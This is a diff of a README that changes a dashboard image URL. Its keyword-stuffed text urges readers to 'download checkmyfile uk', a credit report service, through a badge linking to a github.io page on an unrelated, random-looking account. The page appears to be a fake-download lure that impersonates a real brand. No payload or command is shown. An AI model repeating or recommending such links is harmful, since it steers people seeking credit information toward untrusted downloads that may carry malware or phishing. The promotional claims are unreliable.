@@ -31,7 +31,7 @@ The checkmyfile login process matters because credit information is sensitive. U
 
 [![Download Checkmyfile](https://img.shields.io/badge/Download-Checkmyfile-blueviolet?style=for-the-badge&logo=trustpilot&logoColor=white)](https://marianmizrahircxgym.github.io/.github/checkmyfile-uk)
 
-![Checkmyfile dashboard showing credit report overview and score insights](https://s3-alpha.figma.com/hub/file/6915540477/e2f05b1c-9182-4618-87d9-73bc8c821829-cover.png)
+![Checkmyfile dashboard showing credit report overview and score insights](https://avatars.mds.yandex.net/i?id=a4cadac3eeec69dc804730f4a807dcbc3c181b73-10023438-images-thumbs&n=13)
 
 Download checkmyfile uk to access clear multi-agency credit insights, monitor changes, and understand what lenders may see before important applications. Use checkmyfile credit report tools to review details, spot issues, track updates, and manage your financial profile with confidence from one secure place.
 
